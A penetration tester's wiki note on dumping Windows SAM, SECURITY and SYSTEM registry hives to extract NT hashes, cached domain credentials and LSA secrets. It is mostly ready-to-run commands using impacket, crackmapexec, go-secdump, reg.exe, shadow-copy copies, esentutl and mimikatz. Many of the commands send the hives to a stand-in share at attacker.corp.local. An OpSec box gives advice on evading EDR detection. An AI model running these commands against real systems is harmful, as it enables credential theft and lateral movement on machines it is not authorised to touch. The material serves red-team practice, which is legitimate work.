---
title: Registry Dump
---

[[notes/mitre-attack/credential-access|Access Credentials]] from the Windows [[notes/windows/registry]] as [[notes/windows/credential-access-admin|local admin]].
The *Security Account Manager* stores NT hashes of local users in the `SAM` registry hive.
The *Local Security Authority* stores Domain Cached Credentials (DDC) of the last ten user logons as well as plain text passwords or NT hashes of local and domain service accounts in the `SECURITY` hive.

DCC hashes are hard to crack, but you can try with a small wordlist.
See [[notes/cryptography/hash-cracking]] for details.

# Dump from Linux

Connect to the *Remote Registry* service over SMB and save the hives to a SMB share.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-reg -k -no-pass srv01.corp.local save -keyName 'HKLM\SAM' -o '\\attacker.corp.local\share'
    impacket-reg -k -no-pass srv01.corp.local save -keyName 'HKLM\SYSTEM' -o '\\attacker.corp.local\share'
    impacket-reg -k -no-pass srv01.corp.local save -keyName 'HKLM\SECURITY' -o '\\attacker.corp.local\share'
    ~~~

Connect to the *Remote Registry* service, read the boot key from the `SYSTEM` hive, save the `SAM` and `SECURITY` hives to disk and download them via SMB.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-secretsdump administrator:'passw0rd'@srv01.corp.local
    ~~~

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb srv01.corp.local --local-auth -u administrator -p 'passw0rd' --sam --lsa
    ~~~

Connect to *Remote Registry* and dump the registry hives without touching disk by temporally relaxing ACLs.

=== "[[notes/tools/go-secdump]]"
    ~~~ bash
    go-secdump -host srv01.corp.local -local -user administrator -pass 'passw0rd'
    ~~~

> **OpSec:**
>
> Some EDRs detect Impacket and CME because they access the `ADMIN$` share and write the dumps to `C:\Windows\Temp\*.tmp` ([source](http://web.archive.org/web/20230719134515/https://www.login-securite.com/2023/07/13/dpapi-dont-put-administration-passwords-in/)).
>
> A few EDRs detect remote access to `SAM` even without this indicators.
> In this case you can try to run any of the Windows builtins remotely instead of relying on the *Remote Registry*.

Dump the `SAM` hive trough local registry access to a SMB share.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-atexec -silentcommand administrator:'passw0rd'@srv01.corp.local 'reg.exe save hklm\sam \\attacker.corp.local\share\%COMPUTERNAME%-sam.save'
    ~~~

# Extract on Linux

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-secretsdump -sam ./sam.save -security ./security.save -system ./system.save LOCAL
    ~~~

=== "[[notes/tools/pypykatz]]"
    ~~~ bash
    pypykatz registry --sam ./sam.save --security ./security.save --system ./system.save
    ~~~

# Dump on Windows

Save registry hives directly to a SMB share.

=== "reg.exe"
    ~~~ bat
    reg.exe save hklm\sam \\attacker.corp.local\share\%COMPUTERNAME%-sam.save
    reg.exe save hklm\security \\attacker.corp.local\share\%COMPUTERNAME%-security.save
    reg.exe save hklm\system \\attacker.corp.local\share\%COMPUTERNAME%-system.save
    ~~~

Copy registry hives from a [[notes/windows/shadow-copy]] to a SMB share.

=== "cmd.exe"
    ~~~ bat
    vssadmin.exe list shadows
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam \\attacker.corp.local\share\%COMPUTERNAME%-sam.save
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\security \\attacker.corp.local\share\%COMPUTERNAME%-security.save
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system \\attacker.corp.local\share\%COMPUTERNAME%-system.save
    ~~~

=== "esentutl.exe"
    ~~~ bat
    esentutl.exe /y /vss C:\Windows\System32\config\sam /d \\attacker.corp.local\share\%COMPUTERNAME%-sam.save
    esentutl.exe /y /vss C:\Windows\System32\config\security /d \\attacker.corp.local\share\%COMPUTERNAME%-security.save
    esentutl.exe /y /vss C:\Windows\System32\config\system /d \\attacker.corp.local\share\%COMPUTERNAME%-system.save
    ~~~

Parse hives in memory without touching disk.

=== "[[notes/tools/mimikatz]]"
    ~~~
    mimikatz.exe token::elevate lsadump::sam lsadump::secrets exit
    ~~~

Untested tools:

- [RegSave](https://github.com/EncodeGroup/RegSave)
